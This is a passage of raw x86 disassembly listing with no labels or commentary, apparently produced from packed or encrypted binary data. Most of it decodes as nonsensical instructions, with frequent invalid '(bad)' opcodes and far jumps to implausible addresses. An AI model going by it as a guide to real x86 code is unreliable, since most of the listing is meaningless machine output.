  40fa3e:	hlt    
  40fa3f:	pushf  
  40fa40:	or     eax,DWORD PTR [esi+0x7c]
  40fa43:	aad    0x60
  40fa45:	in     eax,dx
  40fa46:	inc    eax
  40fa47:	(bad)  
  40fa48:	mov    ecx,0xe7b5a337
  40fa4d:	mov    bl,0x3a
  40fa4f:	test   eax,0x5a17ea12
  40fa54:	into   
  40fa55:	cmp    eax,0xaecf7b3d
  40fa5a:	and    eax,0x41614fe2
  40fa5f:	ds pop esp
  40fa61:	cmp    BYTE PTR ds:0xdc287e95,bh
  40fa67:	cmp    ah,BYTE PTR [eax-0x2fea75e8]
  40fa6d:	retf   0xa61a
  40fa70:	pop    ecx
  40fa71:	nop
  40fa72:	pop    ebx
  40fa73:	xchg   edx,eax
  40fa74:	iret   
  40fa75:	fdiv   QWORD PTR [eax-0x47]
  40fa78:	jnp    0x40faef
  40fa7a:	pop    edi
  40fa7b:	cwde   
  40fa7c:	jo     0x40fa7a
  40fa7e:	out    dx,eax
  40fa7f:	xor    BYTE PTR [edi-0xe388353],dh
  40fa85:	pop    es
  40fa86:	dec    DWORD PTR [ebx]
  40fa88:	pusha  
  40fa89:	xchg   ebp,esp
  40fa8b:	jmp    0x2abf01b8
  40fa90:	aaa    
  40fa91:	int3   
  40fa92:	rol    BYTE PTR [esi-0x24],0x2
  40fa96:	sbb    BYTE PTR [esi-0x1e7d3c32],ch
  40fa9c:	(bad)  
  40fa9d:	xchg   edx,eax
  40fa9e:	inc    esp
  40fa9f:	bound  ecx,QWORD PTR [edx+esi*1]
  40faa2:	cdq    
  40faa3:	add    ch,0x6f
  40faa6:	out    0x44,eax
  40faa8:	mov    WORD PTR [ebp-0x88cf71d],ss
  40faae:	arpl   WORD PTR [esp+eiz*2],ax
  40fab1:	cs xchg esi,eax
  40fab3:	sub    BYTE PTR [edx],ah
  40fab5:	xchg   ebp,eax
  40fab6:	add    esp,DWORD PTR [esp+edx*2-0x24c75ed2]
  40fabd:	jmp    0xcb49:0xd48574ab
  40fac4:	xor    eax,0x90c62800
  40fac9:	retf   0x509c
  40facc:	xchg   esi,eax
  40facd:	inc    ebx
  40face:	dec    ebp
  40facf:	out    0x1f,al
  40fad1:	stos   DWORD PTR es:[edi],eax
  40fad2:	popa   
  40fad3:	lock inc ebx
  40fad5:	fist   DWORD PTR [ebp-0x2]
  40fad8:	aam    0x23
  40fada:	aaa    
  40fadb:	outs   dx,DWORD PTR ds:[esi]
  40fadc:	mov    ds:0xffffa558,eax
  40fae1:	ins    DWORD PTR es:[edi],dx
  40fae2:	scas   al,BYTE PTR es:[edi]
  40fae3:	mov    ecx,0x6a544e26
  40fae8:	and    edi,ebp
  40faea:	out    0x68,al
  40faec:	cmp    DWORD PTR [ecx],0x8db41436
  40faf2:	push   eax
  40faf3:	nop
  40faf4:	shl    BYTE PTR [ebp+0x309485eb],1
  40fafa:	aaa    
  40fafb:	xor    eax,0x40d0f56c
  40fb00:	shl    BYTE PTR [edx+0xb],cl
  40fb03:	or     eax,0xd78612d1
  40fb08:	dec    ebp
  40fb09:	inc    ebx
  40fb0a:	and    eax,0x5b591bcf
  40fb0f:	cmp    al,0x81
  40fb11:	jp     0x40fb85
  40fb13:	pop    ds
  40fb14:	push   0x6d
  40fb16:	push   0x90e4f8aa
  40fb1b:	adc    al,0x97
  40fb1d:	cli    
  40fb1e:	out    0xfc,eax
  40fb20:	jl     0x40fb67
  40fb22:	sbb    eax,0xec8209d0
  40fb27:	cmp    DWORD PTR [edi+edx*1-0x33],esi
  40fb2b:	stos   DWORD PTR es:[edi],eax
  40fb2c:	xchg   edi,eax
  40fb2d:	lock xor ah,BYTE PTR [edx+0x1e7314ed]
  40fb34:	xor    BYTE PTR [eax-0x32],dl
  40fb37:	cwde   
  40fb38:	pop    esp
  40fb39:	adc    BYTE PTR [esi],ah
  40fb3b:	inc    ecx
  40fb3c:	pop    es
  40fb3d:	(bad)
  40fb42:	rol    DWORD PTR [eax+0x65],cl
  40fb45:	dec    eax
  40fb46:	in     eax,dx
  40fb47:	dec    esp
  40fb48:	or     BYTE PTR [edi+0x55f59047],cl
  40fb4e:	xor    DWORD PTR [esi+0x5552f086],0x0
  40fb55:	add    al,0xae
  40fb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb58:	mov    WORD PTR [ecx],gs
  40fb5a:	mov    al,0x17
  40fb5c:	iret   
  40fb5d:	adc    edi,DWORD PTR [ecx+0xc]
  40fb60:	outs   dx,BYTE PTR ds:[esi]
  40fb61:	(bad)  [ebp+0x2ca6b222]
  40fb67:	jae    0x40fb65
  40fb69:	cmp    dl,ah
  40fb6b:	stos   WORD PTR es:[edi],ax
  40fb6d:	pop    eax
  40fb6e:	(bad)  
  40fb6f:	and    edi,DWORD PTR [edx+0x26]
  40fb72:	repnz push esi
  40fb74:	fs retf 0x9839
  40fb78:	mov    ch,0x98
  40fb7a:	popa   
  40fb7b:	into   
  40fb7c:	xor    edi,edi
  40fb7e:	jae    0x40fbbb
  40fb80:	dec    esp
  40fb81:	aam    0xed
  40fb83:	daa    
  40fb84:	(bad)  
  40fb85:	sahf   
  40fb86:	push   ebx
  40fb87:	inc    ebx
  40fb88:	les    esi,FWORD PTR [ecx+0x62]
  40fb8b:	pop    esp
  40fb8c:	leave  
  40fb8d:	add    DWORD PTR [edi+0x45],ebp
  40fb90:	ror    DWORD PTR [ecx-0x5b13b193],0xb3
  40fb97:	cwde   
  40fb98:	jae    0x40fbb5
  40fb9a:	in     al,0xa7
  40fb9c:	loope  0x40fb65
  40fb9e:	inc    esp
  40fb9f:	xchg   BYTE PTR [esi+0x79860fe9],ah
  40fba5:	stc    
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x74
  40fbc9:	pop    es
  40fbca:	xchg   ebp,eax
  40fbcb:	mov    esi,0x7e7eb6d0
  40fbd0:	jl     0x40fc4f
  40fbd2:	jle    0x40fc52
  40fbd4:	ret    0x23be
  40fbd7:	aaa    
  40fbd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbd9:	mov    ecx,0x5f59d8b2
  40fbde:	push   es
  40fbdf:	dec    ecx
  40fbe0:	add    BYTE PTR es:[ebp+0x5746f459],dl
  40fbe7:	enter  0xb9f1,0xb2
  40fbeb:	or     bh,ch
  40fbed:	pop    ds
  40fbee:	mov    BYTE PTR [edx+ebx*1-0x40],ah
  40fbf2:	sub    al,0xaa
  40fbf4:	lea    ebx,[edx+0x3]
  40fbf7:	mov    ebx,DWORD PTR [ebx]
  40fbf9:	jecxz  0x40fb7b
  40fbfb:	lods   al,BYTE PTR ds:[esi]
  40fbfc:	aas    
  40fbfd:	sub    BYTE PTR [esi],cl
  40fbff:	xchg   ebx,eax
  40fc00:	loopne 0x40fbc1
  40fc02:	fiadd  WORD PTR [ebp+0x18]
  40fc05:	pop    ebx
  40fc06:	xchg   esi,eax
  40fc07:	dec    ebp
  40fc08:	and    BYTE PTR ds:0xb2e3e9d2,dh
  40fc0e:	lahf   
  40fc0f:	mov    dl,0x60
  40fc11:	test   DWORD PTR [ebx-0x1a],edi
  40fc14:	dec    edi
  40fc15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc16:	jp     0x40fc15
  40fc18:	int3   
  40fc19:	mov    ch,0x28
  40fc1b:	mov    ebp,0xcde66815
  40fc20:	popf   
  40fc21:	outs   dx,DWORD PTR ds:[esi]
  40fc22:	mov    al,ds:0x5dcf5b8c
  40fc27:	popf   
  40fc28:	and    DWORD PTR [ebp+0x4b],ecx
  40fc2b:	shl    BYTE PTR [eax-0x59],0xf3
  40fc2f:	sar    eax,1
  40fc31:	and    eax,0xb68a8045
  40fc36:	add    DWORD PTR ds:0x91cfc2e,esp
  40fc3c:	mov    al,ds:0x76531c6c
  40fc41:	jns    0x40fc9b
  40fc43:	(bad)  
  40fc44:	ret    
  40fc45:	in     eax,0x95
  40fc47:	aas    
  40fc48:	popa   
  40fc49:	sub    DWORD PTR [edi-0x39],esi
  40fc4c:	ins    DWORD PTR es:[edi],dx
  40fc4d:	fild   DWORD PTR [ebx]
  40fc4f:	jo     0x40fc96
  40fc51:	add    eax,0x26052a30
  40fc56:	sub    dh,BYTE PTR [ebx-0x55]
  40fc59:	mov    cl,0x92
  40fc5b:	sbb    cl,dh
  40fc5d:	in     al,dx
  40fc5e:	pop    ds
  40fc5f:	imul   ecx,edi,0xa75b9c80
  40fc65:	arpl   WORD PTR ds:[ecx],cx
  40fc68:	int    0x1
  40fc6a:	dec    ebx
  40fc6b:	jge    0x40fc59
  40fc6d:	in     al,dx
  40fc6e:	pushf  
  40fc6f:	jns    0x40fc86
  40fc71:	or     BYTE PTR [ecx+0x4603fa66],dl
  40fc77:	ja     0x40fcd0
  40fc79:	xor    esi,DWORD PTR [esi]
  40fc7b:	icebp  
  40fc7c:	popf   
  40fc7d:	inc    esi
  40fc7e:	sub    DWORD PTR [ebp+0x2704295e],ecx
  40fc84:	adc    al,0x47
  40fc86:	sub    al,0xb
  40fc88:	pop    edx
  40fc89:	adc    eax,0x306c75f5
  40fc8e:	clc    
  40fc8f:	xchg   ecx,eax
  40fc90:	sbb    ebx,ebp
  40fc92:	mov    eax,0x4b31d0c8
  40fc97:	enter  0xa455,0x19
  40fc9b:	scas   al,BYTE PTR es:[edi]
  40fc9c:	pop    ebp
  40fc9d:	pusha  
  40fc9e:	pop    esi
  40fc9f:	xchg   ebp,eax
  40fca0:	pop    esp
  40fca1:	pusha  
  40fca2:	push   esi
  40fca3:	mov    esp,0xfeba8832
  40fca8:	push   esi
  40fca9:	or     edx,esi
  40fcab:	and    al,0x2f
  40fcad:	je     0x40fcc0
  40fcaf:	jmp    0xe2f0:0xae5ebb14
  40fcb6:	mov    ds,esp
  40fcb8:	dec    ebx
  40fcb9:	jge    0x40fc5c
  40fcbb:	popa   
  40fcbc:	out    dx,eax
  40fcbd:	xor    al,0xe5
  40fcbf:	fist   WORD PTR [ebx+0x4aeeeea]
  40fcc5:	mov    bl,0xac
  40fcc7:	inc    ecx
  40fcc8:	popa   
  40fcc9:	ret    
  40fcca:	pop    edx
  40fccb:	pop    es
  40fccc:	inc    ecx
  40fccd:	push   esi
  40fcce:	icebp  
  40fccf:	adc    DWORD PTR [eax+0x0],ebp
  40fcd2:	and    BYTE PTR [eax-0x6207111],bl
  40fcd8:	scas   eax,DWORD PTR es:[edi]
  40fcd9:	icebp  
  40fcda:	imul   ebp,DWORD PTR [ecx+0x29b0acc5],0xffffffdd
  40fce1:	scas   al,BYTE PTR es:[edi]
  40fce2:	lods   al,BYTE PTR ds:[esi]
  40fce3:	adc    BYTE PTR ds:0x2ab96d39,0xd0
  40fcea:	xor    al,0xc1
  40fcec:	aas    
  40fced:	add    al,0xcb
  40fcef:	jp     0x40fd34
  40fcf1:	or     ecx,DWORD PTR [ecx+esi*8-0x5b]
  40fcf5:	out    dx,al
  40fcf6:	sub    al,0x5
  40fcf8:	popa   
  40fcf9:	cmp    edx,DWORD PTR [esi+eiz*4-0x7d]
  40fcfd:	adc    al,0x24
  40fcff:	mov    al,0x96
  40fd01:	dec    ecx
  40fd02:	jnp    0x40fd4a
  40fd04:	push   ebp
  40fd05:	jns    0x40fd79
  40fd07:	xchg   esi,eax
  40fd08:	push   ebp
  40fd09:	push   edi
  40fd0a:	rol    DWORD PTR [ebx],1
  40fd0c:	jl     0x40fcfd
  40fd0e:	push   cs
  40fd0f:	fild   DWORD PTR [ecx+0x23cad6aa]
  40fd15:	and    ch,BYTE PTR [eax]
  40fd17:	sti    
  40fd18:	push   eax
  40fd19:	loopne 0x40fd24
  40fd1b:	sub    DWORD PTR [eax],esp
  40fd1d:	adc    al,0x5b
  40fd1f:	mov    bh,0x5c
  40fd21:	mov    ebp,0xc0cfd2ee
  40fd26:	cld    
  40fd27:	mov    al,0x8d
  40fd29:	jg     0x40fd76
  40fd2b:	xchg   ebx,eax
  40fd2c:	xchg   ebp,eax
  40fd2d:	cs push 0xffffff9e
  40fd30:	push   cs
  40fd31:	add    DWORD PTR [eax],esi
  40fd33:	stos   BYTE PTR es:[edi],al
  40fd34:	clc    
  40fd35:	mov    al,ds:0xb87e9dee
  40fd3a:	jp     0x40fd3a
  40fd3c:	mov    cl,0xe1
  40fd3f:	mov    bh,0xf9
  40fd41:	adc    esi,DWORD PTR [ebx+0x4f655439]
  40fd47:	sub    bh,BYTE PTR [edx-0x2039160e]
  40fd4d:	cmp    BYTE PTR [ecx-0x1ffb4637],al
  40fd53:	cmp    BYTE PTR [ecx],ah
  40fd55:	sub    al,0x14
  40fd57:	pop    es
  40fd58:	lea    esi,[ebp-0xa]
  40fd5b:	cmp    ah,BYTE PTR [ebx]
  40fd5d:	or     DWORD PTR [eax+0x6],edx
  40fd60:	ds xor al,0x98
  40fd63:	or     dh,BYTE PTR [edx]
  40fd65:	pushf  
  40fd66:	fisttp WORD PTR [esi-0x1a]
  40fd69:	lods   al,BYTE PTR ds:[esi]
  40fd6a:	aam    0x69
  40fd6c:	or     al,BYTE PTR [ebp-0x41]
  40fd6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd70:	nop
  40fd71:	adc    BYTE PTR [edi],dl
  40fd73:	ss addr16 jmp 0xa14035ad
  40fd7a:	or     esp,edx
  40fd7c:	jle    0x40fded
  40fd7e:	call   0x1999:0xc85ae7
  40fd85:	xor    DWORD PTR [edi-0x2a0ea3c0],eax
  40fd8b:	sub    BYTE PTR [eax-0x48],cl
  40fd8e:	xchg   ecx,eax
  40fd8f:	push   ebp
  40fd90:	out    0x85,eax
  40fd92:	(bad)  
  40fd94:	fwait
  40fd95:	jmp    0x40fdde
  40fd97:	pusha  
  40fd98:	add    edi,edx
  40fd9a:	test   BYTE PTR [eax+0x5019877c],0x7b
  40fda1:	cli    
  40fda2:	xsha256 (bad)
  40fda3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fda4:	push   esp
  40fda5:	fwait
  40fda6:	lea    ebx,[ebp-0x7d]
  40fda9:	cld    
  40fdaa:	(bad)  
  40fdab:	xor    eax,ecx
  40fdad:	mov    edx,0xf24e705d
  40fdb2:	xchg   edi,eax
  40fdb3:	mov    ah,0x8a
  40fdb5:	into   
  40fdb6:	xchg   edi,eax
  40fdb7:	mov    ds:0xb3021422,eax
  40fdbc:	xchg   ecx,eax
  40fdbd:	fiadd  DWORD PTR [edx+0x5ccc8bd5]
  40fdc3:	push   edi
  40fdc4:	xor    ebx,DWORD PTR [esi+0x1e]
  40fdc7:	mov    dl,0x3a
  40fdc9:	cmp    al,0xd7
  40fdcb:	xchg   ebx,eax
  40fdcc:	das    
  40fdcd:	pop    esi
  40fdce:	xor    al,0x68
  40fdd0:	aad    0xb
  40fdd2:	ins    BYTE PTR es:[edi],dx
  40fdd3:	mov    ah,0xfd
  40fdd5:	adc    BYTE PTR [ebx+0x5d66434a],bh
  40fddb:	push   ss
  40fddc:	rol    ch,0xdb
  40fddf:	inc    esi
  40fde0:	pop    ss
  40fde1:	ins    DWORD PTR es:[edi],dx
  40fde2:	out    0x53,eax
  40fde4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fde5:	cmp    eax,ebp
  40fde7:	call   0xc03d25ee
  40fdec:	int    0xf5
  40fdee:	bound  edx,QWORD PTR fs:[esi]
  40fdf1:	test   eax,0x5116d79d
  40fdf6:	loopne 0x40fdba
  40fdf8:	cmp    al,0xa1
  40fdfa:	xchg   DWORD PTR [ebx-0x79abb1e5],esp
  40fe00:	push   ebp
  40fe01:	dec    edx
  40fe02:	xchg   edi,eax
  40fe03:	fs call 0x123e:0x90b7f4be
  40fe0b:	sahf   
  40fe0c:	inc    ecx
  40fe0d:	mov    cl,0x43
  40fe0f:	xor    al,0xf2
  40fe11:	fmul   DWORD PTR [eax-0x80]
  40fe14:	lods   eax,DWORD PTR ds:[esi]
  40fe15:	xchg   esi,eax
  40fe16:	pop    ebp
  40fe17:	push   esp
  40fe18:	(bad)  
  40fe1a:	jecxz  0x40fe0e
  40fe1c:	pop    ebp
  40fe1d:	pop    ds
  40fe1e:	fistp  DWORD PTR [edi]
  40fe20:	jmp    0xc938e56d
  40fe25:	and    ecx,DWORD PTR [esi+ecx*2+0xa]
  40fe29:	and    al,0xf3
  40fe2b:	mov    ecx,ebx
  40fe2d:	push   ebp
  40fe2e:	mov    al,ds:0xf738c94d
  40fe33:	jo     0x40fe40
  40fe35:	cmp    dl,BYTE PTR [ebx+0x2e71680c]
  40fe3b:	and    esi,ecx
  40fe3d:	sbb    eax,0xff933636
  40fe42:	pop    eax
  40fe43:	add    eax,0x81b223d6
  40fe48:	mov    ebp,0x1ac82142
  40fe4d:	int3   
  40fe4e:	inc    eax
  40fe4f:	sbb    BYTE PTR [eax],cl
  40fe51:	mov    cl,0x57
  40fe53:	inc    ebx
  40fe54:	xor    esp,edx
  40fe56:	xchg   esi,eax
  40fe57:	arpl   WORD PTR [ebx],ax
  40fe59:	cdq    
  40fe5a:	mov    BYTE PTR [eax+0x6a6acec],ch
  40fe60:	add    al,0xf2
  40fe62:	mov    dl,0xe7
  40fe64:	mov    ch,0xb4
  40fe66:	aad    0x8b
  40fe68:	test   cl,bh
  40fe6a:	push   0xe5f5c0f
  40fe6f:	inc    edi
  40fe70:	dec    edi
  40fe71:	jp     0x40fed7
  40fe73:	outs   dx,DWORD PTR ds:[esi]
  40fe74:	icebp  
  40fe75:	and    cl,BYTE PTR [edx]
  40fe77:	jae    0x40fed0
  40fe79:	sub    BYTE PTR [ecx+ebx*2+0x56],ah
  40fe7d:	push   ebx
  40fe7e:	inc    ebp
  40fe7f:	cmp    ebp,DWORD PTR [esp+esi*2-0x482d8bff]
  40fe86:	jns    0x40fe24
  40fe88:	loope  0x40ff05
  40fe8a:	pusha  
  40fe8b:	mov    ecx,0xbcbcd8d2
  40fe90:	push   0x3e
  40fe92:	mov    ch,ch
  40fe94:	xchg   ebx,eax
  40fe95:	cmp    al,0xaf
  40fe97:	push   ebx
  40fe98:	mov    bl,0x76
  40fe9a:	push   es
  40fe9b:	jbe    0x40fe3f
  40fe9d:	(bad)  
  40fe9e:	xchg   edi,eax
  40fe9f:	push   esi
  40fea0:	push   0x5c092a9c
  40fea5:	hlt    
  40fea6:	scas   al,BYTE PTR es:[edi]
  40fea7:	pop    edx
  40fea8:	jmp    0x35404f24
  40fead:	add    dl,BYTE PTR [eax]
  40feaf:	fstp   TBYTE PTR [ecx]
  40feb1:	mov    ds:0xc9755b5f,al
  40feb6:	pop    edx
  40feb7:	fbstp  TBYTE PTR ds:[edi-0x76]
  40febb:	push   edx
  40febc:	push   ecx
  40febd:	retf   
  40febe:	jmp    DWORD PTR [esi+esi*2-0x7ff46d6b]
  40fec5:	inc    ebp
  40fec6:	(bad)  
  40fec7:	int    0xf
  40fec9:	adc    eax,0xfba1126f
  40fece:	or     BYTE PTR [edi-0x4b],0xf5
  40fed2:	pop    es
  40fed3:	add    ebx,DWORD PTR [eax+0x3b]
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x3c534346
  40fef3:	leave  
  40fef4:	aad    0xde
  40fef6:	mov    ch,0x7e
  40fef8:	jle    0x40ff76
  40fefa:	jge    0x40ff7a
  40fefc:	jle    0x40ff56
  40fefe:	lea    esp,[eax]
  40ff00:	data16 (bad) [eax]
  40ff03:	mov    esp,0x501ac342
  40ff08:	inc    ebx
  40ff09:	add    bl,al
  40ff0b:	(bad)  
  40ff0c:	xchg   ebx,eax
  40ff0d:	test   eax,0xf201ccf7
  40ff12:	and    dh,BYTE PTR [edi+0x2c9eed25]
  40ff18:	adc    eax,0xb6b49653
  40ff1d:	out    dx,eax
  40ff1e:	fwait
  40ff1f:	sti    
  40ff20:	sbb    ebx,ebp
  40ff22:	cmp    edi,ecx
  40ff24:	xchg   esp,eax
  40ff25:	test   al,0xf1
  40ff27:	mov    esi,0xbad09c70
  40ff2c:	xchg   edi,eax
  40ff2d:	jle    0x40ff0b
  40ff2f:	and    BYTE PTR [esi-0x76371402],0x5e
  40ff36:	das    
  40ff37:	add    BYTE PTR [edx+0x5f],cl
  40ff3a:	xor    ebx,DWORD PTR [esi-0x33]
  40ff3d:	in     al,0xc
  40ff3f:	pop    eax
  40ff40:	retf   0x1318
  40ff43:	ret    0x86be
  40ff46:	mov    ecx,0xdc0e7803
  40ff4b:	div    BYTE PTR [edx+edi*8+0x154297e8]
  40ff52:	and    DWORD PTR [edi+ebp*1-0x5c],eax
  40ff56:	inc    ebx
  40ff57:	inc    esi
  40ff58:	or     BYTE PTR [eax+0x2e531de7],dh
  40ff5e:	out    dx,eax
  40ff5f:	mov    BYTE PTR [eax],al
  40ff61:	or     DWORD PTR [ebp+0x78],ebp
  40ff64:	or     bh,BYTE PTR [ebx+0x74226a10]
  40ff6a:	xchg   ebp,eax
  40ff6b:	scas   al,BYTE PTR es:[edi]
  40ff6c:	retf   0xd0ee
  40ff6f:	jge    0x40ffd3
  40ff71:	gs xchg esi,eax
  40ff73:	stos   BYTE PTR es:[edi],al
  40ff74:	xchg   DWORD PTR ss:[esi+0x348f9844],esi
  40ff7b:	inc    edi
  40ff7c:	ds js  0x40ff6c
  40ff7f:	jo     0x40ff71
  40ff81:	pop    ss
  40ff82:	mov    ecx,0x7b970d3c
  40ff87:	cdq    
  40ff88:	inc    eax
  40ff89:	xor    BYTE PTR [esi],cl
  40ff8b:	loop   0x40ff5b
  40ff8d:	int3   
  40ff8e:	loop   0x40ff37
  40ff90:	or     BYTE PTR [esi+0x2c],bl
  40ff93:	add    al,0x59
  40ff95:	pusha  
  40ff96:	loop   0x40ff6f
  40ff98:	and    BYTE PTR [esp+edx*2-0x34e63080],al
  40ff9f:	pushf  
  40ffa0:	ins    DWORD PTR es:[edi],dx
  40ffa1:	dec    ebp
  40ffa2:	int    0x0
  40ffa4:	xor    dl,BYTE PTR [ebx]
  40ffa6:	dec    edx
  40ffa7:	out    dx,al
  40ffa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffa9:	(bad)  
  40ffab:	fild   WORD PTR [ecx+0x4203b3fb]
  40ffb1:	out    dx,al
  40ffb2:	or     eax,0xcd73457a
  40ffb7:	xchg   edx,eax
  40ffb8:	js     0x40ffb0
  40ffba:	mov    eax,ds:0x11d27c35
  40ffbf:	(bad)  
  40ffc0:	scas   al,BYTE PTR es:[edi]
  40ffc1:	pop    ebx
  40ffc2:	neg    BYTE PTR [edx-0x4e]
  40ffc5:	inc    ebx
  40ffc6:	call   DWORD PTR [ebp+0x54]
  40ffc9:	daa    
  40ffca:	adc    ebx,DWORD PTR [eax-0x27f05280]
  40ffd0:	mov    bl,ch
  40ffd2:	push   es
  40ffd3:	xchg   edx,eax
  40ffd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffd5:	mov    ds:0x8f3633b9,eax
  40ffda:	mov    ds:0x6a0ce41,eax
  40ffdf:	mov    ecx,0x817a8ffd
  40ffe4:	outs   dx,BYTE PTR ds:[esi]
  40ffe5:	xchg   BYTE PTR [edi+0x4227a9bf],al
  40ffeb:	es dec eax
  40ffed:	ja     0x41005a
  40ffef:	cmp    al,0xfa
  40fff1:	(bad)
  40fff5:	retf   0xc20f
  40fff8:	or     eax,0xcf9ee2fa
  40fffd:	ins    DWORD PTR es:[edi],dx
  40fffe:	mov    al,ds:0xd31414c3
  410003:	add    eax,0x3f078f00
  410008:	ins    BYTE PTR es:[edi],dx
  410009:	pushaw 
  41000b:	jp     0x410063
  41000d:	loopne 0x40ffc2
  41000f:	xor    BYTE PTR [ecx+0x62],bh
  410012:	rcr    DWORD PTR [edi+esi*4-0x715314],cl
  410019:	or     ecx,DWORD PTR [ebx+0x63]
  41001c:	push   ebp
  41001d:	das    
  41001e:	pop    ss
  41001f:	jp     0x410074
  410021:	ins    DWORD PTR es:[edi],dx
  410022:	bound  edx,QWORD PTR [ebp+0x76]
  410025:	pushf  
  410026:	repz sub DWORD PTR [edx],eax
  410029:	ja     0x40ffc7
  41002b:	push   edx
  41002c:	pop    edx
  41002d:	psubusb mm6,mm4
  410030:	iret   
  410031:	and    edi,esi
  410033:	mov    al,0xbf
  410035:	in     al,dx
  410036:	sub    al,0x35
  410038:	into   
  410039:	mov    dh,ch
  41003b:	and    al,0x95
  41003d:	jno    0x410019
  41003f:	shr    BYTE PTR [edi],cl
  410041:	outs   dx,DWORD PTR ds:[esi]
  410042:	fs cld 
  410044:	fisttp QWORD PTR [edx]
  410046:	shl    DWORD PTR [edi],1
  410048:	shl    DWORD PTR [eax-0x48],1
  41004b:	test   al,0x84
  41004d:	stos   BYTE PTR es:[edi],al
  41004e:	adc    edx,ecx
  410050:	dec    eax
  410051:	out    dx,eax
  410052:	push   es
  410053:	pop    ecx
  410054:	mov    esi,0xa6613b42
  410059:	pop    ds
  41005a:	js     0x41007d
  41005c:	xchg   esi,eax
  41005d:	imul   edi,DWORD PTR [edi+0x3154c89d],0xbdfbf7a7
  410067:	jl     0x4100ae
  410069:	mov    esp,0xba345e0b
  41006e:	lea    ebp,ds:0x7483225e
  410074:	hlt    
  410075:	repnz shl BYTE PTR [ebp+ecx*8-0x24],cl
  41007a:	(bad)  
  41007b:	leave  
  41007c:	cld    
  41007d:	adc    BYTE PTR [eax-0x28],0x63
  410081:	inc    edi
  410082:	jecxz  0x410062
  410084:	cmp    DWORD PTR [ebx+ebx*8],ecx
  410087:	mov    dl,0xaf
  410089:	ins    DWORD PTR es:[edi],dx
  41008a:	mov    esi,0xa7cc6ad5
  41008f:	ja     0x41009b
  410091:	adc    al,ah
  410093:	bound  ecx,QWORD PTR [esi+edi*4-0x9235ad1]
  41009a:	mov    al,0x60
  41009c:	dec    edi
  41009d:	and    DWORD PTR es:[esi+eax*2-0x57],edi
  4100a2:	cmp    bh,BYTE PTR [edx+edi*2+0x2e5d5b05]
  4100a9:	sbb    esp,esp
  4100ab:	pop    ebp
  4100ac:	sbb    BYTE PTR [eax],ch
  4100ae:	mov    bl,0xa8
  4100b0:	jge    0x41004c
  4100b2:	call   0x8e4c:0x9b5d8924
  4100b9:	aas    
  4100ba:	nop
  4100bb:	repnz and ebx,DWORD PTR [edi-0x6fb9a177]
  4100c2:	pop    edx
  4100c3:	into   
  4100c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100c5:	fs in  eax,dx
  4100c7:	xchg   ecx,eax
  4100c8:	push   esi
  4100c9:	mov    BYTE PTR [esp+eax*4],ch
  4100cc:	adc    DWORD PTR [esi],esi
  4100ce:	adc    DWORD PTR [ecx+edi*1],edi
  4100d1:	sub    BYTE PTR [eax-0x6d2faaa8],ch
  4100d7:	bound  ebp,QWORD PTR [edi+0x19a38e2f]
  4100dd:	jmp    0x410127
  4100df:	out    0x5c,eax
  4100e1:	add    edx,DWORD PTR [bx+si]
  4100e4:	push   ecx
  4100e5:	xor    edx,DWORD PTR [eax-0x7ceb653d]
  4100eb:	int    0x5d
  4100ed:	push   cs
  4100ee:	and    eax,0x4dfe8d78
  4100f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100f4:	sub    eax,0xbabefe1f
  4100f9:	jo     0x410140
  4100fb:	fisttp WORD PTR [ebx+0x18]
  4100fe:	call   0xac07:0x9ab28cd0
  410105:	push   cs
  410106:	pop    ecx
  410107:	sub    dh,ah
  410109:	cs cdq 
  41010b:	lock cs xchg ecx,eax
  41010e:	jmp    0xed32901
  410113:	mov    edi,0xcfc08adb
  410118:	jp     0x410120
  41011a:	sub    BYTE PTR [esi-0x2],bh
  41011d:	ror    BYTE PTR [eax-0x73fb8bd1],cl
  410123:	cmp    DWORD PTR [edx+0x6f],esp
  410126:	je     0x410179
  410128:	sbb    DWORD PTR [edi+eiz*2+0x4ec5a4a5],esi
  41012f:	je     0x4100be
  410131:	test   eax,0xd6d7d956
  410136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410137:	jmp    0x41015f
  410139:	add    eax,0xd13ce5ed
  41013e:	aas    
  41013f:	jp     0x410186
  410141:	call   DWORD PTR [ecx]
  410143:	not    eax
  410145:	mov    ah,0xe3
  410147:	jle    0x410131
  410149:	cmp    BYTE PTR [edx],ah
  41014b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41014c:	sbb    bh,BYTE PTR [edx-0xd]
  41014f:	or     DWORD PTR [edx],0xffffffc6
  410152:	adc    ebx,eax
  410154:	scas   eax,DWORD PTR es:[edi]
  410155:	enter  0xe012,0x29
  410159:	cli    
  41015a:	test   al,0x9a
  41015c:	(bad)
  410160:	repnz (bad) 
  410162:	loope  0x410117
  410164:	dec    edi
  410165:	sti    
  410166:	imul   edi,DWORD PTR [edx+0x46],0x18054b31
  41016d:	sub    eax,0xf700fed0
  410172:	adc    BYTE PTR [ecx-0x4],cl
  410175:	pop    ecx
  410176:	pushf  
  410177:	ret    
  410178:	cmp    esp,esp
  41017a:	inc    esi
  41017b:	ja     0x4101e4
  41017d:	call   0xcd14640e
  410182:	imul   eax,DWORD PTR [ecx-0xd],0x4515779a
